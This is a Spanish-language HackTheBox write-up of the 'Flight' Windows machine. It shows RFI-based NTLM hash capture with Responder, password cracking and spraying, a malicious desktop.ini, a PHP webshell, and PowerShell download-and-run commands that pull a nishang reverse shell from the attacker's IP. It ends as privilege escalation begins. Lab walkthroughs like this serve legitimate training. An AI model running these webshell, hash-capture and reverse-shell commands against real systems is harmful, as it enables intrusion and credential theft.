---
layout: single
title: Flight HackTheBox
date: 2023-03-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-flight/icono.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - pentesting
tags:
  - Active Directory
  - pentesting
  - windows
  - Remot port Forwarding
---
Buenas a todos, en esta ocasión resolveremos una máquina windows llamada flight lo cual está catalogada como hard en la plataforma de HackTheBox, me costó bastante resolver esta máquina más que nada la escalada de privilegios, disfruten el contendido.

![](/assets/images/htb-writeup-flight/flight.jpg)

Empezamos a escanear para descubrir puertos abiertos en la máquina

```bash
❯ nmap -sS -vvv -p- -Pn -n --min-rate 5000 10.10.11.187 -oG targeted
```

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 23:15 -03
Initiating SYN Stealth Scan at 23:15
Scanning 10.10.11.187 [65535 ports]
Discovered open port 445/tcp on 10.10.11.187
Discovered open port 139/tcp on 10.10.11.187
Discovered open port 80/tcp on 10.10.11.187
Discovered open port 135/tcp on 10.10.11.187
Discovered open port 53/tcp on 10.10.11.187
Discovered open port 9389/tcp on 10.10.11.187
Discovered open port 5985/tcp on 10.10.11.187
Discovered open port 593/tcp on 10.10.11.187
Discovered open port 49673/tcp on 10.10.11.187
Discovered open port 49674/tcp on 10.10.11.187
Discovered open port 3269/tcp on 10.10.11.187
Discovered open port 49667/tcp on 10.10.11.187
Discovered open port 464/tcp on 10.10.11.187
Discovered open port 49725/tcp on 10.10.11.187
Discovered open port 88/tcp on 10.10.11.187
Discovered open port 3268/tcp on 10.10.11.187
Discovered open port 49694/tcp on 10.10.11.187
Discovered open port 389/tcp on 10.10.11.187
Discovered open port 636/tcp on 10.10.11.187
Completed SYN Stealth Scan at 23:16, 26.45s elapsed (65535 total ports)
Nmap scan report for 10.10.11.187
Host is up, received user-set (0.17s latency).
Scanned at 2023-03-14 23:15:53 -03 for 27s
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49694/tcp open  unknown          syn-ack ttl 127
49725/tcp open  unknown          syn-ack ttl 127
```
Seguimos con el escaneo de puertos para descubrir puertos y servicios,
pero antes no viene mal usar la utilidad extractPorts para copiar y pegar los puertos
sin ninguna dificultad

```ruby

❯ extractPorts target
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.187
   5   │     [*] Open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49694,49725
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Sigamos con el escaneo de puertos

```bash
❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49694,49725 10.10.11.187
```
```bash

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-15 09:21:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m54s
| smb2-time: 
|   date: 2023-03-15T09:22:47
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```
Vemos que en el puerto 3269 nos da un dominio, otra forma que encontré para hallar el dominio fue tirando de crackmapexec
```bash

❯ crackmapexec smb 10.10.11.187
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Initializing LDAP protocol database
[*] Initializing WINRM protocol database
[*] Initializing MSSQL protocol database
[*] Initializing FTP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
```
Agregemos el dominio al archivo /etc/hosts

```ruby
echo '10.10.11.187 flight.htb' >> /etc/hosts
```

Revisemos la web

![](/assets/images/htb-writeup-flight/pagina.png)

Después de enumerar un largo rato en la web no encontré nada interesante, asé que procederé a buscar subdominios con gobuster

```ruby

❯ gobuster vhost -u http://flight.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://flight.htb
[+] Method:          GET
[+] Threads:         200
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
===============================================================
2023/03/14 23:43:57 Starting gobuster in VHOST enumeration mode
===============================================================
Found: school.flight.htb (Status: 200) [Size: 3996]
```
Encontramos un subdominio, ahora es tan solo agregarlo al /etc/hosts

```ruby
echo '10.10.11.187 school.flight.htb' >> /etc/hosts
```
Vemos que la página es distinta a la de antes

![](/assets/images/htb-writeup-flight/pagina2.png)

A la hora de darle a HOME podemos ver que la url nos muestra algo interesante

![](/assets/images/htb-writeup-flight/pagina3.png)

Estuve un tiempo intentando ver si es vulnerable a los ataques LFI o sea los local file inclusion, pero veo que las consultas de la web me devuelve lo mismo

![](/assets/images/htb-writeup-flight/pagina4.png)

Probemos con los ataques RFI

Nos ponemos en escucha con el responder

```ruby
❯ responder -I tun0 -w -d
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.105]
    Responder IPv6             [dead:beef:2::1014]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-X8CGHZMJ1L7]
    Responder Domain Name      [8AD5.LOCAL]
    Responder DCE-RPC Port     [47658]

[+] Listening for events...

```
Le lanzamos un curl a la web de la siguiente forma

```ruby
❯  curl -s 'http://school.flight.htb/index.php?view=//10.10.14.105/smb/setensa.txt'
<!DOCTYPE html>
<html>
<head>
<title>Aviation School</title>
<meta charset="UTF-8" />
<link rel="stylesheet" type="text/css" href="styles/style.css" />
<!--[if IE 6]><link rel="stylesheet" type="text/css" href="styles/ie6.css" /><![endif]-->
</head>
<body>
<div id="page">
  <div id="header">
    <div id="section">
      <div><a href="index.html"><img src="images/logo.gif" alt="" /></a></div>
       </div>
    <ul>
      <li><a href="index.php?view=home.html">Home</a></li>
      <li><a href="index.php?view=about.html">About Us</a></li>
      <li><a href="index.php?view=blog.html">Blog</a></li>
    </ul>
  </div>
  <div id="footer">
    <div>
      <div id="connect"> <a href="#"><img src="images/icon-facebook.gif" alt="" /></a> <a href="#"><img src="images/icon-twitter.gif" alt="" /></a> <a href="#"><img src="images/icon-youtube.gif" alt="" /></a> </div>
      <div class="section">
        <p>Copyright &copy; <a href="#">Domain Name</a> - All Rights Reserved | Template By <a href="#">Domain Name</a></p>
      </div>
    </div>
  </div>
</div>
</body>
</html>% 
```
Ahora miramos en el responder y vemos que capturamos un hash NTLMv2,
al final es vulnerable a los ataques RFI, copiemos el hash y guardémoslo en un archivo para
crackearlo con John

```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:690ba1fe456f2723:A876141A0C34E5BED166E1FA0C1D0A5A:010100000000000000330C6CD256D901200B5751A20220540000000002000800380041004400350001001E00570049004E002D00580038004300470048005A004D004A0031004C00370004003400570049004E002D00580038004300470048005A004D004A0031004C0037002E0038004100440035002E004C004F00430041004C000300140038004100440035002E004C004F00430041004C000500140038004100440035002E004C004F00430041004C000700080000330C6CD256D9010600040002000000080030003000000000000000000000000030000055BD617D7D33214E59B58A850B2DDFDF37A55A528650AFED86EC8F736DE5FCB90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320032000000000000000000
```
```bash

❯ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)     
1g 0:00:00:12 DONE (2023-03-15 00:19) 0.08123g/s 866199p/s 866199c/s 866199C/s S@anmeet2k2..S@29$JL
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
Tenemos credenciales, comprobemos si son válidas con crackmapexec

```bash
❯ crackmapexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13'
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
```
Son válidas, ya que tenemos credenciales, con rpcclient podemos enumerar a todos los usuarios del dominio

```bash
❯ rpcclient 10.10.11.187 -U 'svc_apache%S@Ss!K@*t13' -c enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[S.Moon] rid:[0x642]
user:[R.Cold] rid:[0x643]
user:[G.Lors] rid:[0x644]
user:[L.Kein] rid:[0x645]
user:[M.Gold] rid:[0x646]
user:[C.Bum] rid:[0x647]
user:[W.Walker] rid:[0x648]
user:[I.Francis] rid:[0x649]
user:[D.Truff] rid:[0x64a]
user:[V.Stevens] rid:[0x64b]
user:[svc_apache] rid:[0x64c]
user:[O.Possum] rid:[0x64d]
```
Nos reportó 15 usuarios, los copiamos y pegamos en un archivo

## Archivo con los usuarios 
```
Administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
```
Con crackmapexec comprebemos si algunos de estos usuarios reutiliza la contraseña de svc_apache

```bash

❯ crackmapexec smb 10.10.11.187 -u usuarios -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13                      <---
SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
```
El usuario S.Moon reutiliza la contraseña 

Con smbmap miremos los permisos del usuario a nivel de recursos compartidos

```bash
❯  smbmap -H 10.10.11.187 -u 's.moon' -p 'S@Ss!K@*t13'
[+] IP: 10.10.11.187:445	Name: flight.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY	
```
Vemos que Shared tiene capacidad de escritura

Nos conectamos con smbclient

```bash

❯ smbclient //10.10.11.187/Shared -U 's.moon%S@Ss!K@*t13'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Mar 15 07:31:44 2023
  ..                                  D        0  Wed Mar 15 07:31:44 2023

		5056511 blocks of size 4096. 1218917 blocks available
smb: \> 

```
No vemos nada, ya que tenemos capacidad de escritura intentemos subir un archivo

```ruby
❯ whoami > testeo.txt
```

Lo subimos

```bash
smb: \> put testeo.txt
NT_STATUS_ACCESS_DENIED opening remote file \testeo.txt
smb: \> 
```
No me dejó >;(, me parece medio raro porque el smbmap nos reportó que tenemos capacidad de escritura, puedo pensar a que se debe por la extensión del archivo, creo que para prevenir archivo .scf, crearemos e intentemos subir un archivo .ini

```ruby	
❯ whoami > setensa.ini
```

```bash
smb: \> put setensa.ini
putting file setensa.ini as \setensa.ini (0,0 kb/s) (average 0,0 kb/s)
smb: \> 

```
Nos dejó subir el archivo, pero luego de unos minutos se borra, quiero pensar que puede haber alguien por detrás que los esté revisando, probemos subir un archivo .ini malicioso

## Archivo .ini malicioso
```ruby
[.ShellClassInfo]
IconResource=\\10.10.14.105\ojitoquesetensa
```
Antes de subirlo nos ponemos en escucha con el responder

```ruby
❯ responder -I tun0 -w -d
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.105]
    Responder IPv6             [dead:beef:2::1014]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-TFN5VW4Q55X]
    Responder Domain Name      [0LWG.LOCAL]
    Responder DCE-RPC Port     [47036]

[+] Listening for events...

```
Subamos el archivo malicioso

```bash
smb: \> put malicioso.ini
putting file malicioso.ini as \malicioso.ini (0,1 kb/s) (average 0,1 kb/s)
smb: \> 
```
Miremos el responder

```ruby
❯ responder -I tun0 -w -d
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.105]
    Responder IPv6             [dead:beef:2::1014]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-TFN5VW4Q55X]
    Responder Domain Name      [0LWG.LOCAL]
    Responder DCE-RPC Port     [47036]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:8bc58da2784076a6:A887686F7A31E62187E1B18177A8B660:010100000000000000A8EBADD756D901C491AD764C783150000000000200080030004C005700470001001E00570049004E002D00540046004E003500560057003400510035003500580004003400570049004E002D00540046004E00350056005700340051003500350058002E0030004C00570047002E004C004F00430041004C000300140030004C00570047002E004C004F00430041004C000500140030004C00570047002E004C004F00430041004C000700080000A8EBADD756D9010600040002000000080030003000000000000000000000000030000055BD617D7D33214E59B58A850B2DDFDF37A55A528650AFED86EC8F736DE5FCB90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320032000000000000000000
[+] Exiting...
```
Obtenemos un hash NTLMv2 del usuario c.bum, lo copiamos y pegamos para crackearlo con john

```bash
❯ john -w=/usr/share/wordlists/rockyou.txt hash2
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)     
1g 0:00:00:12 DONE (2023-03-15 00:50) 0.08190g/s 862914p/s 862914c/s 862914C/s Tilapia5%..Tikidog
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
Tenemos credenciales, vamos a comprobar con crackmapexec si la credenciales son válida para el usuario

```bash
❯ crackmapexec smb 10.10.11.187 -u 'c.bum' -p 'Tikkycoll_431012284'
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 

```
La credencial es válida

Nuevamente con smbmap nos fijamos los recursos compartidos

```bash
❯ smbmap -H 10.10.11.187 -u 'c.bum' -p 'Tikkycoll_431012284'
[+] IP: 10.10.11.187:445	Name: flight.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ, WRITE	
```

El recurso Web tiene capacidad de escritura, miremos el recurso con smbclient

```bash
❯ smbclient //10.10.11.187/Web -U 'c.bum%Tikkycoll_431012284'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Mar 15 07:57:00 2023
  ..                                  D        0  Wed Mar 15 07:57:00 2023
  flight.htb                          D        0  Wed Mar 15 07:57:00 2023
  school.flight.htb                   D        0  Wed Mar 15 07:57:00 2023

		5056511 blocks of size 4096. 1216693 blocks available
smb: \> 

```
Podemos ver que nos muestra el dominio y el subdominio que enumeramos anteriormente, si entramos a flight.htb vemos que están los archivos de configuración de la página y si le tiramos un whatweb veremos que la web interpreta php

```bash
smb: \> cd flight.htb
smb: \flight.htb\> dir
  .                                   D        0  Wed Mar 15 08:02:00 2023
  ..                                  D        0  Wed Mar 15 08:02:00 2023
  css                                 D        0  Wed Mar 15 08:02:00 2023
  images                              D        0  Wed Mar 15 08:02:00 2023
  index.html                          A     7069  Thu Feb 24 02:58:10 2022
  js                                  D        0  Wed Mar 15 08:02:00 2023

		5056511 blocks of size 4096. 1216693 blocks available
smb: \flight.htb\> 
```
```ruby
❯ whatweb flight.htb
http://flight.htb [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.10.11.187], JQuery[1.4.2], OpenSSL[1.1.1m], PHP[8.1.1], Script[text/javascript], Title[g0 Aviation]
```
Probemos subir una webshell

```php
<?php
  system($_REQUEST['cmd']);
?>
```
Recuerden que el archivo se borra luego de unos minutos, lo tienen que hacer rápido porque si no la webshell.php se borra

Subamos la webshell.php

```bash
smb: \flight.htb\>  put webshell.php
putting file webshell.php as \flight.htb\webshell.php (0,1 kb/s) (average 0,1 kb/s)
smb: \flight.htb\> 
```
Con curl comprobemos si podemos ejecutar comandos

```bash
❯ curl -s 'http://flight.htb/webshell.php?cmd=whoami'
flight\svc_apache
```
Nos dejó ejecutar el whoami, yo voy a tirar de un script de nishang para tener un revshell

Por acá se los dejo

```ruby
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```
Lo descargan y le dan el nombre que les guste

Este script lo tiene que colocar al final de la linea del archivo de nishang

```ruby
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.105 -Port 4444
```
Ahora nos montamos un servidor web con python y nos ponemos en escucha con netcat, al tira de curl deberíamos recibir la revshell

```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Nos ponemos en escucha por netcat

```bash
❯ sudo rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```
Y ahora le lanzamos el curl, comprueben que la webshell.php no se les haya eliminado, si se eliminó es simplemente volverlo a subir

```ruby
curl -s -X GET -G 'http://flight.htb/webshell.php' --data-urlencode "cmd=cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.22/sh.ps1')"
```
Ganamos acceso

![](/assets/images/htb-writeup-flight/acceso.png)

Al tener dos contraseñas de los otros dos usuarios probemos con conectarnos con el usuario c.bum

Primero descargaremos el RunasCs.exe

```ruby
https://github.com/antonioCoco/RunasCs/releases/tag/v1.4
```
```ruby
❯ unzip  RunasCs.zip
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe        
❯ 
```
Ahora lo descargamos en la máquina víctima

Primero montemos un servidor con python3

```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
El archivo lo voy a transferir usando de certutil.exe

```ruby
PS C:\xampp\htdocs\flight.htb>certutil.exe -urlcache -f -split http://10.10.14.105/RunasCs.exe
****  Online  ****
  0000  ...
  c000
CertUtil: -URLCache command completed successfully.
```
Ahora ya que tenemos el RunasCs.exe podemos acceder a la máquina como el usuario c.bum, nuevamente nos montamos un servidor en python3
luego ejecutamos el RunasCs.exe con el script de nishang que utilizamos anteriormente

Montamos el servidor

```bash
sudo python3 -m http.server 80
```
Nos ponemos en escucha por netcat

```bash
❯ sudo rlwrap nc -lvnp 4444
listening on [any] 4444 ...

```
Y en la máquina víctima ejecutamos el script de nishang

```ruby
./RunasCs.exe c.bum Tikkycoll_431012284 "cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.105/sh.ps1')"
```
Ganamos acceso como usuario c.bum

![](/assets/images/htb-writeup-flight/acceso2.png)

Ya podemos ver la primera flag :D

```bash
PS C:\Users\C.bum> cd Desktop
PS C:\Users\C.bum\Desktop> ls


    Directory: C:\Users\C.bum\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        3/15/2023   5:30 PM             34 user.txt                                                              


PS C:\Users\C.bum\Desktop> type user.txt
a9****************************c
PS C:\Users\C.bum\Desktop> 
```
## Escalada de privilegios

Enumeremos el sistema, yo voy a tirar de winpeas.exe

Nos movemos al directorio Temp y lo descargamos con certutil.exe en la máquina víctima

```ruby
certutil.exe -urlcache -f -split http://10.10.14.105/winPEASx64.exe
```
Una vez descargado ejecutamos winpeasx64.exe

```bash

PS C:\Windows\Temp> ./winPEASx64.exe

 Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              

  TCP        [::]                                        80            [::]                                                       
  TCP        [::]                                        88            [::]                                                   
  TCP        [::]                                        135           [::]                                                       
  TCP        [::]                                        389           [::]                                                       
  TCP        [::]                                        443           [::]                                                       
  TCP        [::]                                        445           [::]                                                       
  TCP        [::]                                        464           [::]                                                     
  TCP        [::]                                        593           [::]                                                       
  TCP        [::]                                        636           [::]                                                       
  TCP        [::]                                        3268          [::]                                                        
  TCP        [::]                                        3269          [::]                                                        
  TCP        [::]                                        5985          [::]                                                                 
  TCP        [::]                                        8000          [::]                                        
  TCP        [::]                                        9389          [::]
```
Vemos que el puerto 8000 está abierto, nmap no nos había reportado esta infomación, como yo no puedo accerder al puerto 8000 desde mi máquina en este punto necesitamos hacer un Remote Port Forwarding, tireremos de chisel

